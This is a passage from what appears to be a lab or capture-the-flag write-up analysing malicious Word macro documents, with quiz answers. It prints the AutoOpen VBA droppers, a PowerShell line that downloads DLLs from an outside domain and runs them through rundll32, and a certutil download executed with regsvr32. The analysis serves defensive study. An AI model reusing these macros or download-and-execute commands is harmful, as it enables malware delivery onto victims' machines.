<h4 id="initial-macro-analysis"><span class="me-2"><strong>Initial Macro Analysis</strong></span><a href="#initial-macro-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>We export the discovered macros using <code class="language-plaintext highlighter-rouge">oledump.py</code> with the <code class="language-plaintext highlighter-rouge">-s</code> flag. Streams 12 and 13 contain long, seemingly legitimate functions for validating email addresses and handling MP3 files, which may serve as distractions for analysts. Stream 14 contains the entry point with the <code class="language-plaintext highlighter-rouge">AutoOpen()</code> subroutine, which calls <code class="language-plaintext highlighter-rouge">bxh.eFile</code>.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>oledump.py <span class="nt">-s</span> 14 <span class="nt">-v</span> attacker2.doc
Sub AutoOpen<span class="o">()</span>
    bxh.eFile
End Sub
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">eFile</code> subroutine is located in stream 16:</p>

<div class="language-vb highlighter-rouge"><div class="code-header">
        <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="n">Attribute</span> <span class="n">VB_Name</span> <span class="o">=</span> <span class="s">"bxh"</span>
<span class="k">Sub</span> <span class="nf">eFile</span><span class="p">()</span>
    <span class="k">Dim</span> <span class="nv">QQ1</span> <span class="ow">As</span> <span class="kt">Object</span>
    <span class="k">Set</span> <span class="n">QQ1</span> <span class="o">=</span> <span class="k">New</span> <span class="n">Form</span>
    <span class="n">RO</span> <span class="o">=</span> <span class="n">StrReverse</span><span class="p">(</span><span class="s">"\ataDmargorP\:C"</span><span class="p">)</span>
    <span class="n">ROI</span> <span class="o">=</span> <span class="n">RO</span> <span class="o">+</span> <span class="n">StrReverse</span><span class="p">(</span><span class="s">"sbv.nip"</span><span class="p">)</span>
    <span class="n">ii</span> <span class="o">=</span> <span class="n">StrReverse</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="n">Ne</span> <span class="o">=</span> <span class="n">StrReverse</span><span class="p">(</span><span class="s">"IZOIZIMIZI"</span><span class="p">)</span>
    <span class="n">WW</span> <span class="o">=</span> <span class="n">QQ1</span><span class="p">.</span><span class="n">t2</span><span class="p">.</span><span class="n">Caption</span>
    <span class="n">MyFile</span> <span class="o">=</span> <span class="n">FreeFile</span>
    <span class="n">Open</span> <span class="n">ROI</span> <span class="k">For</span> <span class="n">Output</span> <span class="ow">As</span> <span class="p">#</span><span class="n">MyFile</span>
    <span class="n">Print</span> <span class="p">#</span><span class="n">MyFile</span><span class="p">,</span> <span class="n">WW</span>
    <span class="n">Close</span> <span class="p">#</span><span class="n">MyFile</span>
    <span class="n">fun</span> <span class="o">=</span> <span class="n">Shell</span><span class="p">(</span><span class="n">StrReverse</span><span class="p">(</span><span class="s">"sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc"</span><span class="p">),</span> <span class="n">Chr</span><span class="p">(</span><span class="mi">48</span><span class="p">))</span>
    <span class="k">End</span>
<span class="k">End</span> <span class="k">Sub</span>
</pre></td></tr></tbody></table></code></div></div>

<p>After deobfuscation, the macro’s functionality becomes clearer:</p>

<div class="language-vb highlighter-rouge"><div class="code-header">
        <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="k">Sub</span> <span class="nf">eFile</span><span class="p">()</span>
    <span class="k">Dim</span> <span class="nv">formHandle</span> <span class="ow">As</span> <span class="kt">Object</span>
    <span class="k">Set</span> <span class="n">formHandle</span> <span class="o">=</span> <span class="k">New</span> <span class="n">Form</span>
    <span class="n">directory</span> <span class="o">=</span> <span class="s">"C:\ProgramData\"</span>
    <span class="n">fileLocation</span> <span class="o">=</span> <span class="n">directory</span> <span class="o">+</span> <span class="s">"pin.vbs"</span>
    <span class="n">formCaption</span> <span class="o">=</span> <span class="n">formHandle</span><span class="p">.</span><span class="n">t2</span><span class="p">.</span><span class="n">Caption</span>
    <span class="n">MyFile</span> <span class="o">=</span> <span class="n">FreeFile</span>
    <span class="n">Open</span> <span class="n">fileLocation</span> <span class="k">For</span> <span class="n">Output</span> <span class="ow">As</span> <span class="p">#</span><span class="n">MyFile</span>
    <span class="n">Print</span> <span class="p">#</span><span class="n">MyFile</span><span class="p">,</span> <span class="n">formCaption</span>
    <span class="n">Close</span> <span class="p">#</span><span class="n">MyFile</span>
    <span class="n">fun</span> <span class="o">=</span> <span class="n">Shell</span><span class="p">(</span><span class="s">"cmd /k cscript.exe C:\ProgramData\pin.vbs"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">End</span>
<span class="k">End</span> <span class="k">Sub</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The macro extracts the <code class="language-plaintext highlighter-rouge">Caption</code> text from a form object named “t2” and writes it to <code class="language-plaintext highlighter-rouge">C:\ProgramData\pin.vbs</code>. It then uses <code class="language-plaintext highlighter-rouge">cmd.exe</code> to execute the script via <code class="language-plaintext highlighter-rouge">cscript.exe</code>.</p>

<p><strong>Observations:</strong></p>
<ul>
  <li><strong>Q4:</strong> Find the command located in the ‘fun’ field: <code class="language-plaintext highlighter-rouge">cmd /k cscript.exe C:\ProgramData\pin.vbs</code>.</li>
</ul>

<hr />

<h4 id="code-analysis-1"><span class="me-2"><strong>Code Analysis</strong></span><a href="#code-analysis-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The extracted Visual Basic script (<code class="language-plaintext highlighter-rouge">pin.vbs</code>) performs the following actions:</p>

<ol>
  <li>
    <p><strong>Initial Delay:</strong><br />
The script waits for 4 seconds before proceeding. The purpose of this delay is unclear, as no prior actions are required to complete.</p>

    <div class="language-vb highlighter-rouge"><div class="code-header">
        <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">WAITPLZ</span> <span class="o">=</span> <span class="n">DateAdd</span><span class="p">(</span><span class="c1">'s', 4, Now())</span>
<span class="k">Do</span> <span class="n">Until</span> <span class="p">(</span><span class="n">Now</span><span class="p">()</span> <span class="o">&gt;</span> <span class="n">WAITPLZ</span><span class="p">)</span>
<span class="k">Loop</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><strong>Downloading DLLs:</strong><br />
The script defines five obfuscated PowerShell commands (<code class="language-plaintext highlighter-rouge">LL1</code> through <code class="language-plaintext highlighter-rouge">LL5</code>) that download <code class="language-plaintext highlighter-rouge">.dll</code> files from attacker-controlled domains and save them to <code class="language-plaintext highlighter-rouge">C:\ProgramData</code>.</p>

    <div class="language-powershell highlighter-rouge"><div class="code-header">
        <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$FOOX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'(New-Object Net.WebClient).DownloadFile(''https://priyacareers.com/u9hDQN9Yy7g/pt.html'',''C:\ProgramData\www1.dll'')'</span><span class="p">;</span><span class="w">
</span><span class="n">IEX</span><span class="w"> </span><span class="nv">$FOOX</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">IEX</span><span class="p">;</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><strong>Executing DLLs:</strong><br />
The script creates a <code class="language-plaintext highlighter-rouge">WScript.Shell</code> object to execute the downloaded <code class="language-plaintext highlighter-rouge">.dll</code> files using <code class="language-plaintext highlighter-rouge">rundll32.exe</code>.</p>

    <div class="language-vb highlighter-rouge"><div class="code-header">
        <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="k">Set</span> <span class="n">Shell</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"wscript.shell"</span><span class="p">)</span>
<span class="n">Shell</span><span class="p">.</span><span class="n">Run</span> <span class="s">"powershell"</span> <span class="o">+</span> <span class="n">LL1</span><span class="p">,</span> <span class="mi">0</span>
<span class="n">Shell</span><span class="p">.</span><span class="n">Run</span> <span class="s">"powershell"</span> <span class="o">+</span> <span class="n">LL2</span><span class="p">,</span> <span class="mi">0</span>
</pre></td></tr></tbody></table></code></div>    </div>

    <p>After ensuring all downloads are complete, the script executes the <code class="language-plaintext highlighter-rouge">.dll</code> files:</p>

    <div class="language-vb highlighter-rouge"><div class="code-header">
        <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">OK1</span> <span class="o">=</span> <span class="s">"cmd /c rundll32.exe C:\ProgramData\www1.dll,ldr"</span>
<span class="n">Ran</span><span class="p">.</span><span class="n">Run</span> <span class="n">OK1</span><span class="p">,</span> <span class="mi">0</span>
<span class="n">OK2</span> <span class="o">=</span> <span class="s">"cmd /c rundll32.exe C:\ProgramData\www2.dll,ldr"</span>
<span class="n">Ran</span><span class="p">.</span><span class="n">Run</span> <span class="n">OK2</span><span class="p">,</span> <span class="mi">0</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ol>

<p><strong>Observations:</strong></p>
<ul>
  <li><strong>Q5:</strong> Provide the first domain found in the maldoc: <code class="language-plaintext highlighter-rouge">priyacareers.com</code>.</li>
  <li><strong>Q6:</strong> Provide the second domain found in the maldoc: <em>(Answer based on analysis.)</em></li>
  <li><strong>Q7:</strong> Provide the name of the first malicious DLL it retrieves from the C2 server: <code class="language-plaintext highlighter-rouge">www1.dll</code>.</li>
  <li><strong>Q8:</strong> How many DLLs does the maldoc retrieve from the domains? <code class="language-plaintext highlighter-rouge">5</code>.</li>
  <li><strong>Q9:</strong> Provide the path of where the malicious DLLs are getting dropped onto: <code class="language-plaintext highlighter-rouge">C:\ProgramData</code>.</li>
  <li><strong>Q10:</strong> What program is it using to run DLLs? <code class="language-plaintext highlighter-rouge">rundll32.exe</code>.</li>
  <li><strong>Q11:</strong> How many seconds does the function in the maldoc sleep for to fully execute the malicious DLLs? <code class="language-plaintext highlighter-rouge">4</code>.</li>
</ul>

<hr />

<h3 id="attacker-3"><span class="me-2"><strong>Attacker 3</strong></span><a href="#attacker-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="identifying-macros-1"><span class="me-2"><strong>Identifying Macros</strong></span><a href="#identifying-macros-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Following the patterns observed in Attacker 1 and Attacker 2, we can assume that <code class="language-plaintext highlighter-rouge">attacker3.doc</code> is a <code class="language-plaintext highlighter-rouge">.doc</code> file containing malicious VBA macros. Running <code class="language-plaintext highlighter-rouge">oleid</code> confirms the presence of suspicious VBA macros:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>oleid attacker3.doc 
...snip...
<span class="nt">--------------------</span>+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor <span class="k">for</span>    
                    |                    |          |more info.                
...snip...
</pre></td></tr></tbody></table></code></div></div>

<p>Using <code class="language-plaintext highlighter-rouge">oledump.py</code>, we identify the streams containing macros (marked with “M”):</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>oledump.py attacker3.doc 
A: word/vbaProject.bin
 A1:       423 <span class="s1">'PROJECT'</span>
 A2:        53 <span class="s1">'PROJECTwm'</span>
 A3: M    2017 <span class="s1">'VBA/T'</span>
 A4: m    1127 <span class="s1">'VBA/ThisDocument'</span>
 A5:      2976 <span class="s1">'VBA/_VBA_PROJECT'</span>
 A6:      1864 <span class="s1">'VBA/__SRP_0'</span>
 A7:       190 <span class="s1">'VBA/__SRP_1'</span>
 A8:       348 <span class="s1">'VBA/__SRP_2'</span>
 A9:       106 <span class="s1">'VBA/__SRP_3'</span>
A10: M    1291 <span class="s1">'VBA/d'</span>
A11:       723 <span class="s1">'VBA/dir'</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Observations:</strong><br />
Streams <code class="language-plaintext highlighter-rouge">A3</code>, <code class="language-plaintext highlighter-rouge">A4</code>, and <code class="language-plaintext highlighter-rouge">A10</code> contain likely malicious code. Stream <code class="language-plaintext highlighter-rouge">A4</code> defines generic variables, while <code class="language-plaintext highlighter-rouge">A3</code> and <code class="language-plaintext highlighter-rouge">A10</code> contain the core malicious logic. Since the <code class="language-plaintext highlighter-rouge">autoopen()</code> subroutine is located in <code class="language-plaintext highlighter-rouge">A3</code>, we begin our analysis there.</p>

<hr />

<h4 id="manual-analysis-of-stream-a3"><span class="me-2"><strong>Manual Analysis of Stream A3</strong></span><a href="#manual-analysis-of-stream-a3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Stream <code class="language-plaintext highlighter-rouge">A3</code> contains the following VBA code:</p>

<div class="language-vb highlighter-rouge"><div class="code-header">
        <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="k">Sub</span> <span class="nf">autoopen</span><span class="p">()</span>
    <span class="n">LG</span> <span class="o">=</span> <span class="n">h</span><span class="p">(</span><span class="s">"12%2%...snip...%77"</span><span class="p">)</span>

    <span class="k">Dim</span> <span class="nv">XN</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">WshShell</span>
    <span class="k">Call</span> <span class="n">XN</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="s">"cmd /c set u=tutil&amp;&amp;call copy C:\Windows\System32\cer%u%.exe C:\ProgramData\1.exe"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">Call</span> <span class="n">XN</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">LG</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="k">End</span> <span class="k">Sub</span>
</pre></td></tr></tbody></table></code></div></div>

<p>After cleaning up the code manually, we get a clearer understanding of its functionality:</p>

<div class="language-vb highlighter-rouge"><div class="code-header">
        <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="k">Sub</span> <span class="nf">autoopen</span><span class="p">()</span>
    <span class="n">decoded_command</span> <span class="o">=</span> <span class="n">decodeFunction</span><span class="p">(</span><span class="s">"LONG-ENCODED-STRING"</span><span class="p">)</span>
    <span class="k">Dim</span> <span class="nv">shellInstance</span> <span class="n">as</span> <span class="k">New</span> <span class="n">WshShell</span>
    <span class="k">Call</span> <span class="n">shellInstance</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="s">"cmd /c copy C:\Windows\System32\certutil.exe C:\ProgramData\1.exe"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">Call</span> <span class="n">shellInstance</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">decoded_command</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="k">End</span> <span class="k">Sub</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Step-by-Step Breakdown:</strong></p>
<ol>
  <li>
    <p><strong>Decoding the Command:</strong><br />
The macro passes an encoded string to the function <code class="language-plaintext highlighter-rouge">h</code>, which decodes it. We will analyze the decoding logic later in Stream <code class="language-plaintext highlighter-rouge">A10</code>.</p>
  </li>
  <li>
    <p><strong>Creating a Shell Instance:</strong><br />
A new <code class="language-plaintext highlighter-rouge">WshShell</code> instance is created to execute commands on the host.</p>
  </li>
  <li>
    <p><strong>Copying Certutil:</strong><br />
The macro uses <code class="language-plaintext highlighter-rouge">cmd.exe</code> to copy <code class="language-plaintext highlighter-rouge">C:\Windows\System32\certutil.exe</code> to <code class="language-plaintext highlighter-rouge">C:\ProgramData\1.exe</code>. Certutil is a legitimate Windows utility commonly abused by malware for making HTTP requests.</p>
  </li>
  <li>
    <p><strong>Executing the Decoded Command:</strong><br />
The decoded command is executed using the same <code class="language-plaintext highlighter-rouge">WshShell</code> instance. The <code class="language-plaintext highlighter-rouge">0</code> at the end of the <code class="language-plaintext highlighter-rouge">Shell.run</code> call hides the terminal window, reducing the likelihood of detection.</p>
  </li>
</ol>

<hr />

<h4 id="manual-analysis-of-stream-a10"><span class="me-2"><strong>Manual Analysis of Stream A10</strong></span><a href="#manual-analysis-of-stream-a10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Stream <code class="language-plaintext highlighter-rouge">A10</code> contains the decoding function <code class="language-plaintext highlighter-rouge">h</code> and another unused function <code class="language-plaintext highlighter-rouge">vY</code>:</p>

<div class="language-vb highlighter-rouge"><div class="code-header">
        <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="k">Function</span> <span class="nf">h</span><span class="p">(</span><span class="n">ju</span><span class="p">)</span>
    <span class="n">eR</span> <span class="o">=</span> <span class="n">Split</span><span class="p">(</span><span class="n">ju</span><span class="p">,</span> <span class="s">"%"</span><span class="p">)</span>
    <span class="k">For</span> <span class="n">lc</span> <span class="o">=</span> <span class="mi">0</span> <span class="k">To</span> <span class="n">UBound</span><span class="p">(</span><span class="n">eR</span><span class="p">)</span>
        <span class="n">hh</span> <span class="o">=</span> <span class="n">hh</span> <span class="o">&amp;</span> <span class="n">Chr</span><span class="p">(</span><span class="n">eR</span><span class="p">(</span><span class="n">lc</span><span class="p">)</span> <span class="ow">Xor</span> <span class="mi">111</span><span class="p">)</span>
        <span class="k">Next</span> <span class="n">lc</span>
        <span class="n">h</span> <span class="o">=</span> <span class="n">hh</span>
<span class="k">End</span> <span class="k">Function</span>

<span class="k">Function</span> <span class="nf">vY</span><span class="p">()</span>
    <span class="n">vY</span> <span class="o">=</span> <span class="s">"util"</span>
<span class="k">End</span> <span class="k">Function</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">h</code> function performs a basic XOR decryption. It splits the encoded string by <code class="language-plaintext highlighter-rouge">%</code>, XORs each character with the key <code class="language-plaintext highlighter-rouge">111</code>, and concatenates the results. Implementing this logic in Python allows us to decode the command:</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="n">CIPHER</span> <span class="o">=</span> <span class="sh">"</span><span class="s">12%2%11%79%64%12%79%77%28%10%...</span><span class="sh">"</span>
<span class="n">KEY</span> <span class="o">=</span> <span class="mi">111</span>

<span class="n">cipher_chars</span> <span class="o">=</span> <span class="n">CIPHER</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">%</span><span class="sh">'</span><span class="p">)</span>
<span class="n">plain</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">^</span> <span class="n">KEY</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">cipher_chars</span><span class="p">])</span>
<span class="nf">print</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The decoded command is:</p>

<pre><code class="language-cmd">cmd /c "set u=url&amp;&amp;call C:\ProgramData\1.exe /%u%^c^a^c^h^e^ /f^ hxxp://8cfayv.com/bolb/jaent.php?l=liut6.cab C:\ProgramData\1.tmp &amp;&amp; call regsvr32 C:\ProgramData\1.tmp"
</code></pre>

<p>After cleaning it up:</p>

<pre><code class="language-cmd">cmd /c C:\ProgramData\1.exe /urlcache /f hxxp://8cfayv.com/bolb/jaent.php?l=liut6.cab C:\ProgramData\1.tmp &amp;&amp; call regsvr32 C:\ProgramData\1.tmp
</code></pre>

<p><strong>Explanation:</strong></p>
<ul>
  <li>The macro calls <code class="language-plaintext highlighter-rouge">cmd.exe</code> to execute the copied <code class="language-plaintext highlighter-rouge">certutil.exe</code> (<code class="language-plaintext highlighter-rouge">C:\ProgramData\1.exe</code>) with the <code class="language-plaintext highlighter-rouge">/urlcache /f</code> flags. This makes <code class="language-plaintext highlighter-rouge">certutil</code> download a file from the attacker-controlled domain and save it as <code class="language-plaintext highlighter-rouge">C:\ProgramData\1.tmp</code>.</li>
  <li>The downloaded file is then executed using <code class="language-plaintext highlighter-rouge">regsvr32</code>, another legitimate Windows utility commonly abused by malware.</li>
</ul>

<hr />

<h4 id="observations"><span class="me-2"><strong>Observations</strong></span><a href="#observations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<ul>
  <li><strong>Q1:</strong> Provide the executable name being downloaded: <code class="language-plaintext highlighter-rouge">1.tmp</code>.</li>
  <li><strong>Q2:</strong> What program is used to run the executable? <code class="language-plaintext highlighter-rouge">regsvr32</code>.</li>
  <li><strong>Q3:</strong> Provide the malicious URI included in the maldoc that was used to download the binary: <code class="language-plaintext highlighter-rouge">hxxp://8cfayv.com/bolb/jaent.php?l=liut6.cab</code>.</li>
  <li><strong>Q4:</strong> What folder does the binary get dropped in? <code class="language-plaintext highlighter-rouge">C:\ProgramData</code>.</li>
  <li><strong>Q5:</strong> Which stream executes the binary that was downloaded? <code class="language-plaintext highlighter-rouge">Stream A3</code>.</li>
</ul>

<hr />

<h3 id="attacker-4"><span class="me-2"><strong>Attacker 4</strong></span><a href="#attacker-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="identifying-macros-2"><span class="me-2"><strong>Identifying Macros</strong></span><a href="#identifying-macros-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Following the patterns observed in previous attackers, we begin by confirming the presence of malicious VBA macros in <code class="language-plaintext highlighter-rouge">attacker4.doc</code> using <code class="language-plaintext highlighter-rouge">oleid</code>:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>oleid attacker4.doc 
...snip...
<span class="nt">--------------------</span>+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor <span class="k">for</span>    
                    |                    |          |more info.                
...snip...
</pre></td></tr></tbody></table></code></div></div>

<p>Using <code class="language-plaintext highlighter-rouge">oledump.py</code>, we identify the streams containing macros (marked with “M”):</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>oledump.py attacker4.doc 
...snip...
  6:        41 <span class="s1">'Macros/PROJECTwm'</span>
  7: M   17216 <span class="s1">'Macros/VBA/ThisDocument'</span>
  8:     10917 <span class="s1">'Macros/VBA/_VBA_PROJECT'</span>
...snip...
</pre></td></tr></tbody></table></code></div></div>

<p>The macro code is extracted from stream 7:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>oledump.py <span class="nt">-s</span> 7 <span class="nt">-v</span> attacker4.doc
</pre></td></tr></tbody></table></code></div></div>

<p>The result is 283 lines of heavily obfuscated VBA code. While <code class="language-plaintext highlighter-rouge">vipermonkey</code> can automate deobfuscation, we’ll manually analyze the code to better understand its functionality.</p>

<hr />

<h4 id="manual-deobfuscation"><span class="me-2"><strong>Manual Deobfuscation</strong></span><a href="#manual-deobfuscation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The obfuscated code employs four basic techniques to obscure its behavior:</p>

<ol>
  <li>
    <p><strong>One-liner If … Then End Statements:</strong><br />
These contain impossible conditions (e.g., <code class="language-plaintext highlighter-rouge">If 128918 = 128918 + 1 Then End</code>).</p>
  </li>
  <li>
    <p><strong>Multi-line If … Then Statements:</strong><br />
These also contain impossible conditions (e.g., <code class="language-plaintext highlighter-rouge">If 3264 &lt; 68 Then</code>).</p>
  </li>
  <li>
    <p><strong>GoTo Statements:</strong><br />
These jump to a label on the very next line, effectively doing nothing (e.g., <code class="language-plaintext highlighter-rouge">GoTo zlbrmdtmprviueydvnhzltntlvfofmkntrjatbzfuxavnqxeasqawcqlnddunpozvflosmyvmvfrlwvkcw:zlbrmdtmprviueydvnhzltntlvfofmkntrjatbzfuxavnqxeasqawcqlnddunpozvflosmyvmvfrlwvkcw:</code>).</p>
  </li>
  <li>
    <p><strong>Random Variable Names:</strong><br />
Variables like <code class="language-plaintext highlighter-rouge">Dim bOYvqTVCQck As String</code> make the code harder to read.</p>
  </li>
</ol>

<p>The first step in manual deobfuscation is to remove all non-functional code, including impossible <code class="language-plaintext highlighter-rouge">If</code> statements and useless <code class="language-plaintext highlighter-rouge">GoTo</code> statements. After renaming variables based on their likely purpose, the 283-line script is reduced to 67 lines of cleaner code.</p>

<hr />

<h4 id="manual-analysis"><span class="me-2"><strong>Manual Analysis</strong></span><a href="#manual-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The cleaned-up code reveals the following logic:</p>

<p><strong>Entry Point:</strong><br />
The <code class="language-plaintext highlighter-rouge">AutoOpen()</code> subroutine immediately calls the <code class="language-plaintext highlighter-rouge">IOWZJGNTSGK</code> function:</p>

<div class="language-vb highlighter-rouge"><div class="code-header">
        <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">Sub</span> <span class="nf">IOWZJGNTSGK</span><span class="p">()</span>
